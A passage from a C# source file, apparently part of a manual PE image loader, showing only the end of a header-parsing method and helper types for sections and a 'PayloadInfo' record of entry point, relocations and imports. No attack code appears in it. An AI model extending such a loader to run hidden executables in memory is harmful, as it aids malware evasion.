            {
                Is64Bit = is64,
                Machine = machine,
                ImageBase = imageBase,
                SizeOfImage = sizeOfImage,
                SizeOfHeaders = sizeOfHeaders,
                AddressOfEntryPoint = entryRva,
                RelocRva = relocRva,
                RelocSize = relocSize,
                ImportRva = importRva,
                Sections = sections,
                OptionalHeaderOffset = optHeader,
                DataDirectoryOffset = dataDirOff,
            };
        }

        #endregion

        #region Helper Types

        private struct SectionInfo
        {
            public uint VirtualSize;
            public uint VirtualAddress;
            public uint SizeOfRawData;
            public uint PointerToRawData;
        }

        private sealed class PayloadInfo
        {
            public bool Is64Bit;
            public ushort Machine;
            public IntPtr ImageBase;
            public uint SizeOfImage;
            public uint SizeOfHeaders;
            public uint AddressOfEntryPoint;
            public uint RelocRva, RelocSize;
            public uint ImportRva;
            public SectionInfo[] Sections = Array.Empty<SectionInfo>();
            public int OptionalHeaderOffset;
            public int DataDirectoryOffset;

            public bool HasRelocations => RelocRva != 0 && RelocSize != 0;
        }

        #endregion
    }
}   
